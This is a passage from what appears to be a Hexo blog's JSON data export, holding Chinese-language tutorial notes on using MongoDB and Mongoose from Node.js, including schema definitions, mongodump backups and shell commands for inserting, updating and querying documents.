nodejs驱动，可以在异步的环境下执行。</p>\n<p>同时它也是针对MongoDB操作的一个对象模型库，封装了MongoDB对文档的的一些增删改查等常用方法，让NodeJS操作Mongodb数据库变得更加灵活简单。</p>\n<p>我们通过Mongoose去创建一个“集合”并对其进行增删改查，就要用到它的三个属性：Schema(数据属性模型)、Model、Entity</p>\n<h3 id=\"定义一个Schema\"><a href=\"#定义一个Schema\" class=\"headerlink\" title=\"定义一个Schema\"></a>定义一个Schema</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var mongoose = require(&quot;mongoose&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\">var TestSchema = new mongoose.Schema(&#123;</span><br><span class=\"line\">    name : &#123; type:String &#125;,//属性name,类型为String</span><br><span class=\"line\">    age  : &#123; type:Number, default:0 &#125;,//属性age,类型为Number,默认为0</span><br><span class=\"line\">    time : &#123; type:Date, default:Date.now &#125;,</span><br><span class=\"line\">    email: &#123; type:String,default:&apos;&apos;&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.cnblogs.com/Leo_wl/p/4361289.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Node-js-中使用MongoDB-几乎是标配\"><a href=\"#Node-js-中使用MongoDB-几乎是标配\" class=\"headerlink\" title=\"Node.js 中使用MongoDB(几乎是标配)\"></a>Node.js 中使用MongoDB(几乎是标配)</h3><ul>\n<li>mac中安装MongoDB<br>brew install mongodb</li>\n<li>node.js 中使用mongoose第三方库来管理MongoDB<br>npm install mongoose –save</li>\n</ul>\n<ul>\n<li>为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async</li>\n</ul>\n<ul>\n<li>配置连接DB信息,并导出连接的对象<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import mongoose from &apos;mongoose&apos; // 引入</span><br><span class=\"line\">const options = &#123;</span><br><span class=\"line\">  user: &apos;admin&apos;,</span><br><span class=\"line\">  pwd: &apos;123456&apos;,</span><br><span class=\"line\">  host: &apos;localhost&apos;,</span><br><span class=\"line\">  port: &apos;27017&apos;,</span><br><span class=\"line\">  database: &apos;hollywood&apos;,</span><br><span class=\"line\">  authSource: &apos;admin&apos;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const uri = `mongodb://$&#123;options.user&#125;:$&#123;options.pwd&#125;@$&#123;options.host&#125;:$&#123;options.port&#125;/$&#123;options.database&#125;?authSource=$&#123;options.authSource&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">mongoose.Promise = global.Promise //需要</span><br><span class=\"line\">mongoose.connect(uri)</span><br><span class=\"line\"></span><br><span class=\"line\">export default mongoose</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>定义一个模型的概要，类似于关系型数据库中的定义表结构</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import db from &apos;../db.js&apos;</span><br><span class=\"line\">import logger from &apos;../logger&apos;</span><br><span class=\"line\">const Schema = db.Schema</span><br><span class=\"line\"></span><br><span class=\"line\">//account对应的字段</span><br><span class=\"line\">const accountSchema = new Schema(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: &#123; type: String, maxlength: 15 &#125;,</span><br><span class=\"line\">    password: &#123; type: String, maxlength: 20 &#125;,</span><br><span class=\"line\">    gender: &#123; type: String, enum: [&apos;male&apos;, &apos;female&apos;] &#125;,</span><br><span class=\"line\">    email: &#123; type: String, maxlength: 25 &#125;,</span><br><span class=\"line\">    avatar: &#123; type: String &#125;,</span><br><span class=\"line\">    age: &#123; type: Number &#125;,</span><br><span class=\"line\">    create_date: &#123; type: Date &#125;,</span><br><span class=\"line\">    update_date: &#123; type: Date &#125;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    versionKey: false,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)</span><br><span class=\"line\">accountSchema.pre(&apos;save&apos;, function(next) &#123;</span><br><span class=\"line\">const currentDate = new Date()</span><br><span class=\"line\">if (!this.create_date) &#123;</span><br><span class=\"line\">        this.create_date = currentDate</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">        this.update_date = currentDate</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">next()</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()后</span><br><span class=\"line\">&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">//定义模型的方法</span><br><span class=\"line\">accountSchema.methods.sayHi = () =&gt; (console.log(&apos;sayHi()!!!!!&apos;))</span><br><span class=\"line\">const Account = db.model(&apos;Account&apos;, accountSchema)</span><br><span class=\"line\">export default Account</span><br></pre></td></tr></table></figure>\n<p><strong>保存到数据库, 并返回一个保存到数据库的对象</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import Account from &apos;./model&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">export default class AccountService &#123;</span><br><span class=\"line\">  static async save(json) &#123;</span><br><span class=\"line\">    const accountModel = new Account(json)</span><br><span class=\"line\">    const account = await accountModel.save()</span><br><span class=\"line\">    return account</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Mongoose\"><a href=\"#Mongoose\" class=\"headerlink\" title=\"Mongoose\"></a>Mongoose</h2><p>Mongoose是MongoDB的一个对象模型工具，是基于node-mongodb-native开发的MongoDB nodejs驱动，可以在异步的环境下执行。</p>\n<p>同时它也是针对MongoDB操作的一个对象模型库，封装了MongoDB对文档的的一些增删改查等常用方法，让NodeJS操作Mongodb数据库变得更加灵活简单。</p>\n<p>我们通过Mongoose去创建一个“集合”并对其进行增删改查，就要用到它的三个属性：Schema(数据属性模型)、Model、Entity</p>\n<h3 id=\"定义一个Schema\"><a href=\"#定义一个Schema\" class=\"headerlink\" title=\"定义一个Schema\"></a>定义一个Schema</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var mongoose = require(&quot;mongoose&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\">var TestSchema = new mongoose.Schema(&#123;</span><br><span class=\"line\">    name : &#123; type:String &#125;,//属性name,类型为String</span><br><span class=\"line\">    age  : &#123; type:Number, default:0 &#125;,//属性age,类型为Number,默认为0</span><br><span class=\"line\">    time : &#123; type:Date, default:Date.now &#125;,</span><br><span class=\"line\">    email: &#123; type:String,default:&apos;&apos;&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.cnblogs.com/Leo_wl/p/4361289.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<hr>\n"},{"title":"MongoDB--备份与恢复","date":"2018-04-16T07:10:13.000Z","archives":"SQL","_content":"## [备份(`mongodump`)与恢复(`mongorestore`)](http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html)\n\n### **数据备份**(mongodump)\nMongodb中 使用`mongodump`命令来`备份`MongoDB数据。该命令可以`导出所有数据到指定目录中`。\n\nmongodump命令可以通过`参数`指定导出的`数据量级`转存的服务器。\n\n**语法**\n````\n> mongodump -h dbhost -d dbname -o dbDirectory\n-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`\n-d：需要备份的数据库实例，例如：test\n-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。\n````","source":"_posts/SQL/NoSql/MongoDB/MongoDB-备份与恢复.md","raw":"---\ntitle: MongoDB--备份与恢复\ndate: 2018-04-16 15:10:13\ntags: MongoDB\narchives: SQL\ncategories: 数据库\n---\n## [备份(`mongodump`)与恢复(`mongorestore`)](http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html)\n\n### **数据备份**(mongodump)\nMongodb中 使用`mongodump`命令来`备份`MongoDB数据。该命令可以`导出所有数据到指定目录中`。\n\nmongodump命令可以通过`参数`指定导出的`数据量级`转存的服务器。\n\n**语法**\n````\n> mongodump -h dbhost -d dbname -o dbDirectory\n-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`\n-d：需要备份的数据库实例，例如：test\n-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。\n````","slug":"SQL/NoSql/MongoDB/MongoDB-备份与恢复","published":1,"updated":"2018-09-05T06:33:18.506Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3n00fyzodvwzbei2nk","content":"<h2 id=\"备份-mongodump-与恢复-mongorestore\"><a href=\"#备份-mongodump-与恢复-mongorestore\" class=\"headerlink\" title=\"备份(mongodump)与恢复(mongorestore)\"></a><a href=\"http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html\" target=\"_blank\" rel=\"noopener\">备份(<code>mongodump</code>)与恢复(<code>mongorestore</code>)</a></h2><h3 id=\"数据备份-mongodump\"><a href=\"#数据备份-mongodump\" class=\"headerlink\" title=\"数据备份(mongodump)\"></a><strong>数据备份</strong>(mongodump)</h3><p>Mongodb中 使用<code>mongodump</code>命令来<code>备份</code>MongoDB数据。该命令可以<code>导出所有数据到指定目录中</code>。</p>\n<p>mongodump命令可以通过<code>参数</code>指定导出的<code>数据量级</code>转存的服务器。</p>\n<p><strong>语法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mongodump -h dbhost -d dbname -o dbDirectory</span><br><span class=\"line\">-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`</span><br><span class=\"line\">-d：需要备份的数据库实例，例如：test</span><br><span class=\"line\">-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"备份-mongodump-与恢复-mongorestore\"><a href=\"#备份-mongodump-与恢复-mongorestore\" class=\"headerlink\" title=\"备份(mongodump)与恢复(mongorestore)\"></a><a href=\"http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html\" target=\"_blank\" rel=\"noopener\">备份(<code>mongodump</code>)与恢复(<code>mongorestore</code>)</a></h2><h3 id=\"数据备份-mongodump\"><a href=\"#数据备份-mongodump\" class=\"headerlink\" title=\"数据备份(mongodump)\"></a><strong>数据备份</strong>(mongodump)</h3><p>Mongodb中 使用<code>mongodump</code>命令来<code>备份</code>MongoDB数据。该命令可以<code>导出所有数据到指定目录中</code>。</p>\n<p>mongodump命令可以通过<code>参数</code>指定导出的<code>数据量级</code>转存的服务器。</p>\n<p><strong>语法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mongodump -h dbhost -d dbname -o dbDirectory</span><br><span class=\"line\">-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`</span><br><span class=\"line\">-d：需要备份的数据库实例，例如：test</span><br><span class=\"line\">-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</span><br></pre></td></tr></table></figure></p>\n"},{"title":"MongoDB学习笔记","date":"2018-07-07T08:31:09.000Z","_content":"# [MongoDB学习笔记(JS胖)](http://jspang.com/2017/12/16/mongdb/)\n(2018年1月26日 13:53:11)\n## 第01节：认识和安装MongoDB\n   > MongoDB是`非关系型数据库`\n   关系数据库,是建立在关系模型基础上的数据库。\n   安装步骤：\n    1.去官网下载MongoDB,https://www.mongodb.com/,在网站中找到Download按钮。下载会有点忙,国外的服务器,你懂的。\n    2.下载后进行安装,安装没什么难度,但是对于新手建议选择默认安装,而不选择自己配置。等我们完全熟悉后再定制式配置。\n    3.安装时如果有安全软件,会报一些拦截,一律允许就好,不允许会安装失败的。\n    4.安装完成后,需要配置“环境变量”,目的是再命令行中直接使用,而不需要输入很长的路径了。（此步骤观看视频）\n\n   查看存在数据库命令：`show dbs`\n   查看数据库版本命令：`db.version()` \n\n## 第02节：Mongo基本命令-1(`show dbs` `use xxdb` `show collections` `db` `MongoDB的存储结构`)\n   接下来的几节直接上手`Mongo命令`,`MSSQL`和`MYsql`用的都是`Sql命令`。\n   MongoDB的操作命令就是前端最熟悉的JavaScript命令。\n   先来一个常用的赋值和输出命令,熟悉一下。（操作前你需要打开Mongo服务器和链接到服务器-也就是我们上节讲的`mongod`命令和`mongo`命令）在命令行中输入以下代码。\n   需要注意的是这里的输出不再使用`console.log`(‘巴拉巴拉’),而是使用`print`(‘巴拉巴拉’),这个稍有区别。\n\n   **MongoDB的存储结构**\n    以前我们的关系型数据库的数据结构都是顶层是库,库下面是表,表下面是数据。但是MongoDB有所不同,库下面是集合,集合下面是文件,可以看下面这张图进行了解一下。\n\n    **存储解构不同**\n      关系型数据库\n        --数据库\n        --数据表\n        --数据行\n      非关系型数据库(MongoDB)\n        --数据库\n        --集合\n        --文件\n\n     在学习中我们可以对比记忆,这样才能更好的了解这些名词,其实数据表就是集合,数据行就是文件,当然这只是为了记忆,实质还是有区别的。\n\n   **基础Shell命令**\n    了解`存储结构`后,就可学习基础`Shell`命令,因 命令 较基础,以 列表形式展现,具体使用方法可到视频观看。\n    `show dbs`:显示已有数据库. 如果你刚安装好,会默认有local、admin(config),这是MongoDB的默认数据库,我们在新建库时是不允许起这些名称的。\n    `use admin`： 进入数据,也可以理解成为使用数据库。成功会显示：`switched to db admin`。\n    `show collections`: 显示数据库中的`集合`（关系型中叫`表`,我们要逐渐熟悉）。\n    `db`:显示当前位置. 也就是你当前使用的数据库名称,这个命令算是最常用的,因为你在作任何操作的时候都要先查看一下自己所在的库,以免造成操作错误。\n   \n   `总结`：这节 学习已经 进入 `MongoDB` 世界,使用 比较简单,都是 基本命令, 敲回车就可使用,但还要多进行 练习。`重点` 要转变 以前`数据库存储结构的思想`,`掌握MongoDB的存储结构`。 \n\n## 第03节：Mongo基本命令-2(\"基本数据`增删改查`\" `use db` `insert` `find` `findOne` `update` `remove` `drop` `dropDatabase` `count`)\n   学会基本的 数据 `增删改查`\n   数据操作基础命令：\n    `use db`(建立数据库)：use不仅可以进入一个数据库,如果你敲入的库不存在,它还可以帮你建立一个库。但是在没有集合前,它还是默认为空。\n    `db.集合.insert({\"\":\"\",\"\":\"\"})`:新建数据集合和插入文件（数据）,**当集合没有时,这时候就可以新建一个集合,并向里边插入数据。** `Demo：db.user.insert({“name”:”jspang”})`\n    `db.集合.find( )`:查询所有数据,这条命令会列出集合下的所有数据,可以看到MongoDB是自动给我们加入了索引值的。`Demo：db.user.find()`\n    `db.集合.findOne( )`:查询第一个文件数据,这里需要注意的,所有MongoDB的组合单词都使用首字母小写的驼峰式写法。\n    `db.集合.update({查询},{修改})`:修改文件数据,第一个是查询条件,第二个是要修改成的值。这里注意的是可以多加文件数据项的,比如下面的例子。\n    `db.集合.remove(条件)`：删除文件数据,注意的是要跟一个条件。`Demo`:`db.user.remove({“name”:”jspang”})`\n    **以下基本不用**\n    `db.集合.drop( )`:删除整个集合,这个在实际工作中一定要谨慎使用,如果是程序,一定要二次确认。\n    `db.dropDatabase( )`:删除整个数据库,在删除库时,一定要先进入数据库,然后再删除。实际工作中这个基本不用,实际工作可定需要保留数据和痕迹的。 \n    `db.collections.count({rule})`\n\n## 第04节：用js文件写mongo命令(`var db = connect(\"dbName\")` )\n   命令行写`mongo`命令（shell）实在麻烦(无法忍受windows系统 命令行),这节学习用`JS`文件来写`shell命令`和`执行`。`JS`写`mongo`的`Shell`命令大部分是相同的,只有小部分不一样。\n  **把命令写入JS中**\n    现模拟一个用户登录日志表 信息,用JS进行编写。在一个新建目录下,比如D:/mongoShell/,新建一个goTask.js文件。文件内容如下：\n  > goTask.js文件\n  > var userName=\"jspang\";    //声明一个登录名             \n  > var timeStamp=Date.parse(new Date());     //声明登录时的时间戳  \n  > var jsonDdatabase={\"loginUnser\":userName,\"loginTime\":timeStamp}; //组成JSON字符串\n  > var db = connect('log');   //链接数据库\n  > db.login.insert(jsonDdatabase);  //插入数据\n\n  > print('[demo]log  print success');  //没有错误显示成功\n  > var userName=\"jspang\";    //声明一个登录名             \n  > var timeStamp=Date.parse(new Date());     //声明登录时的时间戳  \n  > var jsonDdatabase={\"loginUnser\":userName,\"loginTime\":timeStamp}; //组成JSON字符串\n  > var db = connect('log');   //链接数据库\n  > db.login.insert(jsonDdatabase);  //插入数据\n  > \n  > print('[demo]log  print success');  //没有错误显示成功\n\n  **执行JS文件**\n  > mongo goTask.js\n\n  总结：这节很好的解决 在终端写 命令行 的难题,虽然大部分Shell和在命令行中写法一样,但是也稍有不同,希望小伙伴们可以轻松掌握。 \n\n## 第05节：批量插入的正确方法(\"批量数据插入 以`数组`方式\" `老版本MongoDB batchInsert` `一次插入不要超 48M` `静态存储` `批量插入性能测试 批量>循环` `数据库性能`)\n   在操作数据库时要注意两个能力：\n    第一个是`快速存储能力`。\n    第二个是`方便迅速查询能力`。\n\n   **批量插入**\n    批量数据插入是以**数组**的方式进行的（如果写错,可以3个回车可以切出来）。我们现在命令行中敲入下面的代码,我们可以看到数据顺利插入了。\n    老版本MongoDB（3.2以前的版本基本都需要）是需要在`Insert`前加一个`batch`单词的,如下代码。\n    `db.test.batchInsert()`\n    **注意**一次插入不要超过48M,`.zip`和`大图片`之类尽量用`静态存储`,MongoDB存储`静态路径`就好,这也算是一个规则。\n\n   **批量插入性能测试**\n    刚学了批量插入,那是循环插入快？还是批量插入快那？在一般人的认知里肯定是批量插入更快（其实这毋庸置疑）,但我们要拿出极客精神,探个究竟,试着写一个小Shell,来验证一下结果。\n    先写一个`循环插入`方法：\n\n    `批量插入`代码:\n\n   **总结**：在工作中`一定`要`照顾数据库性能`,这也是你`水平的体现`,一个技术会了很简单,但是要精通不那么简单。学完这节,记得在工作中如果在循环插入和批量插入举棋不定,那就选批量插入吧,它会给我们更优的性能体验。 \n\n## 第06节：修改：Update常见错误(`只update修改项`)\n   这节开始说一说`Update` 详细操作,先来看下常见错误,知道 困难 或者说 问题在哪里,再提出解决方案。这节会先演示一些错误的 `Update` 方法,然后再说正确的方法。希望不要误导小伙伴。\n   **错误：只update修改项**\n    `Update`的使用方法需要注意\n    db.xxxset.update({\"\":\"\"},`{\"\":\"\"} || [] || variable`)(此方法属于整条数据修改,替换项需要整条数据)\n\n   **正确修改方法**\n    可以声明一个变量,然后把要改变数据的全部信息放入变量,最后执行修改操作。\n  \n   现在这种方法才是正确的,数据修改正常了,但是你会发现写起来非常麻烦,而且特别容易写错。下节我们会介绍`update修改器`,可以很好的解决这个问题。 \n\n## 第07节：修改：初识update修改器(`$set/$set嵌套内容` `$unset` `$inc` `multi` `upsert`)\n   上节的`修改`用起来实在是`不够优雅`,这是我们一个伟大的前端不能接受的,所以我们要学习`update修改器`,来解决这个问题。`update修改器`可以帮助我们`快速`和`简单`的修改数据,让我们的操作更简单方便。\n  **$set修改器**\n    用来修改一个指定的键值(key),这时候我们要修改上节的sex和age就非常方便了,只要一句话就可以搞定。\n   > db.workmate.update({\"name\":\"MinJie\"},{\"$set\":{sex:2,age:21}})\n    修改好后,我们可以用db.workmate.find()来进行查看,你会发现数据已经被修改。\n   **修改嵌套内容(内嵌文档)**\n   > db.workmate.update({\"name\":\"MinJie\"},{\"$set\":{\"skill.skillThree\":'word'}})\n   \n  **$unset用于将key删除**\n   > db.workmate.update({\"name\":\"MinJie\"},{$unset:{\"age\":''}})\n  \n  **$inc对数字进行计算**\n   它是对`value值`的修改,但是修改的`必须是数字`,`字符串`是`不起效果`的。\n   > db.workmate.update({\"name\":\"MinJie\"},{$inc:{\"age\":-2}})\n\n  **multi选项**\n   `multi`是有`ture`和`false`两个值,`true代表全部修改`,`false代表只修改一个(默认值)`。\n\n  **upsert选项**\n   `upsert`也有`ture`和`false`两个值：`true代表没有就添加`,`false代表没有不添加(默认值)`。\n\n  **总结**：这节的内容非常多,主要学习了`update修改器`有关的一些东西。一定要多练习几遍,否则很快就会忘记的。\n\n## 第08节：修改：update`数组`修改器(`$push` `$ne` `$addToSet` `$each` `$pop`)\n  已学会一些`基础修改器`,这节主要学习`数组修改器的操作`,也可`修改内嵌文档`,也就是`对象形式的数据`。\n  **$push追加数组/内嵌文档值**\n   `$push`的功能是`追加数组中的值`,但我们也经常用它操作`内嵌文档`,就是{}对象型的值。\n    先看一个追加数组值的方式,比如我们要给小王加上一个爱好(interset)为画画（draw）：\n   > db.workmate.update({name:'xiaoWang'},{$push:{interest:'draw'}})\n   当然`$push`修饰符还可以为`内嵌文档增加值`.\n    比如我们现在要给我们的UI,增加一项新的技能skillFour为draw,这时候我们可以操作为：\n   > db.workmate.update({name:'MinJie'},{$push:{\"skill.skillFour\":'draw'}})\n   `$push修饰符`在工作中是最常用的,因为 `数据`一般都会涉及`数组`和`内嵌文档`的操作,一定要掌握。\n\n  **$ne查找是否存在**(类似 `if(xxx === undefined || !xxx)/else` 判断)\n    它主要的作用是,`检查一个值是否存在`,如`不存在`再 执行操作,`存在`就不执行,这个很`容易弄反`,记得我刚学的时候就经常弄反这个修改器的作用,给自己增加了很多坑。\n   > db.workmate.update({name:'xiaoWang',\"interest\":{$ne:'playGame'}},{$push:{interest:'Game'}})\n   **总结**：没有则修改,有则不修改。\n  \n  **$addToSet 升级版的$ne**\n    它是$ne的升级版本（查找是否存在,不存在就push上去）,操作起来更直观和方便,所以再工作中这个要比$en用的多。\n   > db.workmate.update({name:\"xiaoWang\"},{$addToSet:{interest:\"readBook\"}})\n\n  **$each 批量追加**\n    它可以传入一个`数组`,一次增加`多个值`进去,相当于`批量操作`,性能同样比循环操作要好很多,这个是需要我们注意的,工作中也要先组合成数组,然后用批量的形式进行操作。\n   > var newInterset=[\"Sing\",\"Dance\",\"Code\"];\n   > db.workmate.update({name:\"xiaoWang\"},{$addToSet:{interest:{$each:newInterset}}})\n\n  **$pop 删除数组值**\n    `$pop`只删除一次,并不是删除所有数组中的值。而且它有`两个选项`,`1`和`-1`。\n    1：从数组末端进行删除\n    -1：从数组开端进行删除\n   > db.workmate.update({name:'xiaoWang'},{$pop:{interest:1}})\n  \n  **数组定位修改**\n    有时候只知道修改数组的第几位,但并不知道是什么,这时候我们可以使用`interest.int`的形式。\n    `例子` 比如我们现在要修改xiaoWang的第三个兴趣为编码（Code）,注意这里的计数是从0开始的。\n   > db.workmate.update({name:'xiaoWang'},{$set:{\"interest.2\":\"Code\"}})\n\n  **总结**：这节主讲`数组`和`内嵌文档`有关的`update`修改器,内容很多,都需要不断熟练记忆。当然如果你记不住,你至少记住这个博客网址,因为技术胖把笔记已经给你整理好了。\n\n## 第09节：修改：状态返回与安全(`应答式/非应答式` `db.runCommand()` `findAndModify()`)\n  在操作数据库时,对`数据的修改`需要`足够的安全措施`,实际工作中,用`db.collections.update`不多,修改时都用`findAndModify`,它`返回`来一些必要的`参数`,让我们对`修改`多了很多`控制`力,`控制力的加强`也就是对`安全的强化能力加强`。\n\n  **应答式写入**\n   先了解一个概念：`应答式写入`。在`以前`的文章中,我们的操作都是`非应答式写入`,就是在`操作完`数据库后,它并没有给我们任何的`回应`和`返回值`,而是我们自己安慰自己写了一句话（print(‘[update]:The data was updated successfully’);）。这在`工作中 不允许`,因为根本`不能提现`我们`修改的结果`。\n   **应答式**写入就会给我们`直接返回结果`(报表),结果里边的包含项会很多,这样我们就可以很好的进行程序的控制和安全机制的处理。有点像`前端`调用`后端接口`,无论作什么,后端都要给我一些`状态字节`一样。\n  \n  **db.runCommand()**\n   是数据库运行命令的`执行器`,执行命令`首选`就要使用它,因为它在`Shell`和`驱动程序`间提供了一致的接口。（几乎操作数据库的所有操作,都可以使用`runCommand`来执行）现在我们试着用`runCommand`来修改数据库,看看结果和直接用`db.collections.update`有什么`不同`。\n\n   > db.workmate.update({sex:1},{$set:{money:1000}},false,true)\n   > var resultMessage=db.runCommand({getLastError:1})\n   > printjson(resultMessage);\n\n   上边代码 修改所有男士 每人增加1000元钱(money),然后用`db.runCommand()`执行,可看到执行结果在控制台返回。\n    {\n      \"connectionId\" : 1,\n      \"updatedExisting\" : true,\n      \"n\" : 2,\n      \"syncMillis\" : 0,\n      \"writtenTo\" : null,\n      \"err\" : null,\n      \"ok\" : 1\n    }\n    `false`：第一句末尾的false是upsert的简写,代表没有此条数据时不增加;\n    `true`：true是multi的简写,代表修改所有,这两个前边已学过。\n    `getLastError:1` :表示返回功能错误,这里的参数很多,如果有兴趣请自行查找学习,这里不作过多介绍。\n    `printjson`：表示以json对象的格式输出到控制台。\n    `db.listCommands( )`:查看所有的Commad命令, 内容很多, 本课程只讲解`工作中经常使用`的内容。\n\n   比如我们要查看是否和数据库链接成功了,就可以使用Command命令。\n   `db.runCommand({ping:1})`\n   返回`ok:1`就代表链接正常。\n\n  **findAndModify**\n   从名字看,`findAndModify`是`查找并修改`的意思。配置它可以在修改后给我们返回修改的结果。看下面代码：\n   > var myModify={\n   >  findAndModify:\"workmate\",\n   >  query:{name:'JSPang'},\n   >  update:{$set:{age:18}},\n   >  new:true    //更新完成,需要查看结果,如果为false不进行查看结果\n   > }\n   > var ResultMessage=db.runCommand(myModify);\n   > \n   > printjson(ResultMessage)\n   `findAndModify`的`性能`是不如`db.collections.update`的性能好,但实际工作中都使用它,毕竟要`商用程序`安全性还是比较重要的。\n   `findAndModify属性值`:\n    `query`:需要查询的条件/文档\n    `sort`: 排序\n    `remove`:[boolean]是否删除查找到的文档,值填写true,可以删除。\n    `new`:[boolean]返回更新前的文档还是更新后的文档。\n    `fields`:需要返回的字段\n    `upsert`:没有这个值是否增加。\n   **总结**：这节讲了一些跟`安全有关的操作`,但这`不是全部`,我们随着课程的深入还会继续学习更多的知识。工作中尽量使用`findAndModify`来进行更新数据,这样会更安全和直观,这点性能的损失是值得的。\n\n## 第10节：查询：find的不等修饰符(`简单查找(\"x.x\")转字符串` `筛选字段(第二对象参数 boolean || 0/1)` `不等修饰符`)\n  `MongoDB`的`查找操作` 分几节课来讲,因为内容比较多, `开发中` 查找 是应用最多的操作,几乎每个模块都会用到,所以`查找部分`将是本套课的`重中之重`。这节课我们先来看看简单的查询条件,也了解一下find基础用法。\n  如果你以前操作过`关系型数据库`比如`MySql` 你会对>(大于),<(小于),=(等于)这些东西很熟悉,但是`非关系型数据库`不能直接使用这些符号,稍有区别。\n  **构造数据**\n   